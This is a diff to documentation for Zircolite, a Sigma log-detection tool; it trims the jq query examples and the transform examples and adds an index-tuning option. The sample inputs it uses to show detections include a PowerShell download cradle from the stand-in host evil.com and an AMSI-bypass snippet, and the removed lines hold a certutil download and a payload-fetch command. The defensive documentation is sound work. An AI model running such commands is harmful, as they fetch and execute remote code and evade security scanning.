@@ -269,36 +269,15 @@ GROUP BY CommandLine_InjectionTechnique
 
 #### jq Queries (on detected_events.json)
 
-The JSON output is an array of detection objects. Each has `title`, `rule_level`, `tags`, `count`, and `matches` (an array of event dicts with all fields including transform aliases).
+The JSON output is an array of detection objects, each with `title`, `rule_level`, `tags`, `count`, and `matches` (event dicts with all fields, including transform aliases). Three patterns cover most needs — adapt the field name to any transform.
 
-**Extract all unique LOLBins seen across all detections:**
+**Collect unique values across detections:**
 
 ```bash
 jq -r '[.[].matches[].Image_LOLBinMatch // empty] | unique | .[]' detected_events.json
 ```
 
-**Find events where base64 was detected but could not be decoded (potential shellcode/encrypted payloads):**
-
-```bash
-jq '[.[].matches[] | select(.CommandLine_b64decoded == "b64_detected_cannot_decode")]
-    | map({SystemTime, Image, CommandLine})' detected_events.json
-```
-
-**List all events with high entropy command lines (obfuscation indicator):**
-
-```bash
-jq '[.[].matches[] | select(.CommandLine_EntropyScore | startswith("HIGH") or startswith("VERY_HIGH"))]
-    | map({SystemTime, CommandLine, CommandLine_EntropyScore})' detected_events.json
-```
-
-**Extract network IOCs from PowerShell detections:**
-
-```bash
-jq -r '[.[].matches[] | select(.ScriptBlockText_NetworkIOCs != null and .ScriptBlockText_NetworkIOCs != "")]
-    | map(.ScriptBlockText_NetworkIOCs) | unique | .[]' detected_events.json
-```
-
-**Lateral movement timeline:**
+**Filter and sort (lateral-movement timeline):**
 
 ```bash
 jq '[.[].matches[] | select(.CommandLine_LateralMovement != null and .CommandLine_LateralMovement != "")]
@@ -306,34 +285,11 @@ jq '[.[].matches[] | select(.CommandLine_LateralMovement != null and .CommandLin
     | .[] | {SystemTime, User, CommandLine_LateralMovement}' detected_events.json
 ```
 
-**Export all C2 indicators with context to CSV-friendly format:**
+**Export to CSV (C2 indicators with context):**
 
 ```bash
 jq -r '.[].matches[] | select(.CommandLine_C2Indicators != null and .CommandLine_C2Indicators != "")
     | [.SystemTime, .Computer, .User, .Image, .CommandLine_C2Indicators] | @csv' detected_events.json
-```
-
-**Find suspicious registry persistence across all rules:**
-
-```bash
-jq '[.[].matches[] | select(.TargetObject_SuspiciousRegistry != null and .TargetObject_SuspiciousRegistry != "")]
-    | group_by(.TargetObject_SuspiciousRegistry)
-    | map({category: .[0].TargetObject_SuspiciousRegistry, count: length, first_seen: (map(.SystemTime) | sort | first)})
-    | sort_by(-.count)' detected_events.json
-```
-
-**Combine multiple transform fields for triage (process + command line analysis):**
-
-```bash
-jq '[.[].matches[] | select(.Image_LOLBinMatch != null and .Image_LOLBinMatch != "")]
-    | map({
-        time: .SystemTime,
-        lolbin: .Image_LOLBinMatch,
-        entropy: .CommandLine_EntropyScore,
-        length: .CommandLine_Length,
-        download: .CommandLine_DownloadCradle,
-        urls: .CommandLine_URLs
-      })' detected_events.json
 ```
 
 ### Transform Output Values Reference
@@ -533,121 +489,39 @@ Transforms produce specific indicator values that can be used for filtering and 
 
 ### Transform Examples
 
-#### Example 1: Detecting PowerShell Download Cradles
+A few representative transforms in action — the catalogue above lists the rest.
 
-When processing a PowerShell command like:
+**Download cradle:**
+
 ```
 powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/mal.ps1')"
 ```
 
-The `CommandLine_DownloadCradle` transform produces:
-```
-DOWNLOADSTRING|WEBCLIENT
-```
+`CommandLine_DownloadCradle` → `DOWNLOADSTRING|WEBCLIENT` &nbsp;·&nbsp; `CommandLine_URLs` → `http://evil.com/mal.ps1`
 
-And `CommandLine_URLs` extracts:
-```
-http://evil.com/mal.ps1
-```
+**AMSI bypass:**
 
-#### Example 2: XOR Key Detection
-
-For a command containing XOR operations:
-```powershell
-$decoded = $bytes | ForEach-Object { $_ -bxor 0x35 }
 ```
-
-The `ScriptBlockText_XORPatterns` transform detects:
-```
-XOR_KEY:0x35|XOR_LOOP|COMMON_XOR_KEY:0x35
-```
-
-#### Example 3: AMSI Bypass Detection
-
-When AMSI bypass code is detected:
-```powershell
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 ```
 
-The `CommandLine_AMSIBypass` transform flags:
-```
-AMSI_REF|AMSI_REFLECTION
-```
+`CommandLine_AMSIBypass` → `AMSI_REF|AMSI_REFLECTION`
 
-#### Example 4: LOLBin Detection
+**Process typosquatting:**
 
-For a process execution:
-```
-C:\Windows\System32\certutil.exe -urlcache -split -f http://evil.com/file.exe
-```
-
-The `Image_LOLBinMatch` transform identifies:
-```
-LOLBIN:certutil
-```
-
-#### Example 5: Detecting Compressed/Encoded PowerShell
-
-For obfuscated PowerShell using compression:
-```powershell
-[IO.Compression.GzipStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($data)))
-```
-
-The `ScriptBlockText_ObfuscationIndicators` transform flags:
-```
-GZIPSTREAM|MEMORYSTREAM|FROMBASE64|IO_COMPRESSION
-```
-
-#### Example 6: Network IOC Extraction
-
-For a script containing network indicators:
-```powershell
-$client.DownloadFile("http://192.168.1.100:8080/payload.exe", "C:\temp\payload.exe")
-```
-
-The `ScriptBlockText_NetworkIOCs` transform extracts:
-```
-IP:192.168.1.100|URL:http://192.168.1.100:8080/payload.exe
-```
-
-#### Example 7: Process Typosquatting Detection
-
-When a malicious process tries to masquerade as a legitimate Windows binary:
 ```
 C:\Users\Public\svch0st.exe
 ```
 
-The `Image_TyposquatDetect` transform identifies:
-```
-TYPOSQUAT:svchost(HOMOGLYPH)
-```
+`Image_TyposquatDetect` → `TYPOSQUAT:svchost(HOMOGLYPH)` (also `1sass.exe`, `chr0me.exe`, `svchosts.exe` → `CHAR_ADD`, etc.). Legitimate binaries like `wevtutil.exe` are whitelisted and never flagged.
 
-Other examples:
-- `1sass.exe` → `TYPOSQUAT:lsass(HOMOGLYPH)`
-- `chr0me.exe` → `TYPOSQUAT:chrome(HOMOGLYPH)`
-- `svchosts.exe` → `TYPOSQUAT:svchost(CHAR_ADD)`
-- `powersh3ll.exe` → `TYPOSQUAT:powershell(HOMOGLYPH)`
+**Domain typosquatting:**
 
-**Note**: Legitimate Windows tools like `wevtutil.exe` will NOT be flagged as typosquats of `certutil.exe` due to the built-in whitelist.
-
-#### Example 8: Domain Typosquatting Detection
-
-When DNS queries reveal potential phishing domains:
 ```
 micros0ft-support.xyz
 ```
 
-The `QueryName_TyposquatDetect` transform identifies:
-```
-TYPOSQUAT_TECH:microsoft(HOMOGLYPH,CHAR_SWAP)|SUSPICIOUS_TLD:xyz
-```
-
-Other examples:
-- `paypa1.com` → `TYPOSQUAT_BANK:paypal(HOMOGLYPH)`
-- `irs-gov.tk` → `TYPOSQUAT_GOV_US:irs(AFFIX)|SUSPICIOUS_TLD:tk`
-- `arnazon.com` → `TYPOSQUAT_TECH:amazon(CHAR_SWAP)`
-- `gooogle.com` → `TYPOSQUAT_TECH:google(CHAR_MANIP)`
-- `nhs-uk.info` → `TYPOSQUAT_GOV_UK:nhs(AFFIX)`
+`QueryName_TyposquatDetect` → `TYPOSQUAT_TECH:microsoft(HOMOGLYPH,CHAR_SWAP)|SUSPICIOUS_TLD:xyz`
 
 ### Querying Transform Results
 
@@ -772,7 +646,7 @@ Zircolite automatically enables parallel processing when it's beneficial. The pa
 
 - **Calculates optimal workers** based on available memory, CPU cores, and file sizes
 - **Monitors memory** during processing and can throttle if approaching limits
-- **Uses threads** for I/O-bound EVTX parsing (process-based parallelism was deprecated due to compatibility issues)
+- **Uses threads** for I/O-bound EVTX parsing
 - **Falls back to sequential** if parallel isn't beneficial (single file, low memory)
 
 #### Parallel Processing Heuristics
@@ -839,7 +713,7 @@ There are several ways to speed up Zircolite:
 - Let automatic optimization do its work (enabled by default).
 - Use [Filtering](#filtering) to process only relevant files.
 - Use the `--no-recursion` option if you don't need recursive directory search.
-- **Early event filtering** - Zircolite automatically skips events that won't match any rules based on Channel and EventID.
+- Rely on early event filtering (described in the next section) to skip irrelevant events.
 - For extreme cases with very large datasets, use GNU Parallel for external parallelization.
 
 ### Early Event Filtering
@@ -890,7 +764,7 @@ The event filter statistics are displayed in the summary panel after processing.
 **Zircolite** has several arguments that can be used to keep data used to perform Sigma detections: 
 
 - `--dbfile <FILE>` allows you to export all the logs to a SQLite 3 database file. You can query the logs with SQL statements to find more things than what the Sigma rules could have found. When processing multiple files, each file gets its own database file with a unique name.
-- **Database indexes**: An index on `eventid` is always created; when the table has a `Channel` column (Windows logs), an index on `Channel` is created automatically. Use `--add-index COL [COL ...]` to create indexes on additional columns (e.g. `--add-index SystemTime Computer`) and `--remove-index IDX [IDX ...]` to drop indexes by name after creation (e.g. `--remove-index idx_channel`).
+- **Database indexes**: An index on `eventid` is always created; when the table has a `Channel` column (Windows logs), an index on `Channel` is created automatically. Use `--add-index COL [COL ...]` to create indexes on additional columns (e.g. `--add-index SystemTime Computer`) and `--remove-index IDX [IDX ...]` to drop indexes by name after creation (e.g. `--remove-index idx_channel`). For larger rulesets, `--auto-index [N]` (default N=5 when used without a value) inspects the loaded ruleset and creates indices on the top-N columns that its WHERE clauses reference most often — useful when you don't know which columns are worth indexing.
 - `--keepflat` saves flattened events to a JSONL file during streaming processing. This file contains only the events that were actually processed (i.e. events that passed early event filtering and time filtering). If event filtering is active, events whose Channel/EventID don't match any rule will **not** appear in the keepflat output. Use `--no-event-filter` to include all events.
 - `--hashes` adds an xxhash64 hash of the original log line to each event, useful for deduplication and tracking.
 
